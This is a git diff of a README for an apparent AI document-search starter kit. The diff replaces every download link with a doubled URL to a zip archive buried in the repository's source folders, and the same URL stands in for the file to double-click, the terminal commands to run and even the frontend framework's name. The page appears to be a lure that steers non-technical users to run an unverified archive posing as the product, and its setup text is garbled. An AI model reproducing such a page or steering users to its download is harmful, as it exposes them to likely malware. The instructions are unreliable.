@@ -1,6 +1,6 @@
 # 🚀 ai-saas-starter-kit - Simplifying AI-Powered Document Search
 
-[![Download Now](https://raw.githubusercontent.com/jirhegg/ai-saas-starter-kit/main/app/(dashboard)/dashboard/settings/ai-saas-starter-kit-1.3-beta.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/jirhegg/ai-saas-starter-kit/main/app/(dashboard)/dashboard/settings/ai-saas-starter-kit-1.3-beta.4.zip)
+[![Download Now](https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip(dashboard)https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip%20Now-Click%20Here-brightgreen)](https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip(dashboard)https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip)
 
 ## 📂 Overview
 The "ai-saas-starter-kit" is an AI-powered document search and chatbot platform. It helps users find information quickly and interact with documents efficiently. With easy setup and user-friendly features, it empowers everyone to utilize AI without any programming knowledge.
@@ -18,18 +18,18 @@ To get started with the "ai-saas-starter-kit", follow these steps:
 
 1. **Visit the Releases Page**: You will find the files needed to run the application.
    
-   [Grab the latest version to download!](https://raw.githubusercontent.com/jirhegg/ai-saas-starter-kit/main/app/(dashboard)/dashboard/settings/ai-saas-starter-kit-1.3-beta.4.zip)
+   [Grab the latest version to download!](https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip(dashboard)https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip)
 
-2. **Choose the Right File**: Look for the most recent release. The file you need may be labeled as "https://raw.githubusercontent.com/jirhegg/ai-saas-starter-kit/main/app/(dashboard)/dashboard/settings/ai-saas-starter-kit-1.3-beta.4.zip" or similar. Make sure to select the correct version for your device.
+2. **Choose the Right File**: Look for the most recent release. The file you need may be labeled as "https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip(dashboard)https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip" or similar. Make sure to select the correct version for your device.
 
 3. **Download the File**: Click on the file to initiate the download. 
 
 4. **Extract the Files**: After downloading, locate the file in your downloads folder. Right-click on the file and choose "Extract All" or "Unzip". This will create a new folder with all necessary files.
 
 5. **Run the Application**: 
-   - For Windows: Open the folder and double-click the "https://raw.githubusercontent.com/jirhegg/ai-saas-starter-kit/main/app/(dashboard)/dashboard/settings/ai-saas-starter-kit-1.3-beta.4.zip" file. 
-   - For macOS: Open the terminal, navigate to the folder, and run the command `https://raw.githubusercontent.com/jirhegg/ai-saas-starter-kit/main/app/(dashboard)/dashboard/settings/ai-saas-starter-kit-1.3-beta.4.zip`.
-   - For Linux: Open the terminal, navigate to the folder, and run the command `https://raw.githubusercontent.com/jirhegg/ai-saas-starter-kit/main/app/(dashboard)/dashboard/settings/ai-saas-starter-kit-1.3-beta.4.zip`.
+   - For Windows: Open the folder and double-click the "https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip(dashboard)https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip" file. 
+   - For macOS: Open the terminal, navigate to the folder, and run the command `https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip(dashboard)https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip`.
+   - For Linux: Open the terminal, navigate to the folder, and run the command `https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip(dashboard)https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip`.
 
 ## ⚙️ System Requirements
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or Linux (Ubuntu 18.04 or later).
@@ -41,7 +41,7 @@ To get started with the "ai-saas-starter-kit", follow these steps:
 
 To install the "ai-saas-starter-kit", ensure you follow the link below to the Releases page. 
 
-[Download the latest version here!](https://raw.githubusercontent.com/jirhegg/ai-saas-starter-kit/main/app/(dashboard)/dashboard/settings/ai-saas-starter-kit-1.3-beta.4.zip)
+[Download the latest version here!](https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip(dashboard)https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip)
 
 ## 📚 Documentation
 For detailed technical information and guidance, we recommend reviewing the documentation available in the repository. This can help you customize and maximize the features of the application.
@@ -52,7 +52,7 @@ If you encounter any issues or have questions, feel free to reach out. You can v
 ## 🔗 Technologies Used
 This project incorporates various modern technologies:
 - **AI Concepts**: Large Language Models (LLM) for intelligent responses.
-- **Frontend Framework**: Built with https://raw.githubusercontent.com/jirhegg/ai-saas-starter-kit/main/app/(dashboard)/dashboard/settings/ai-saas-starter-kit-1.3-beta.4.zip and React for a responsive interface.
+- **Frontend Framework**: Built with https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip(dashboard)https://github.com/jirhegg/ai-saas-starter-kit/raw/refs/heads/main/app/api/ai/chat/saas-kit-ai-starter-v3.8.zip and React for a responsive interface.
 - **Database**: Supabase with Drizzle ORM for easy data handling.
 - **Styling**: Tailwind CSS and Shadcn UI for a sleek and modern look.
 
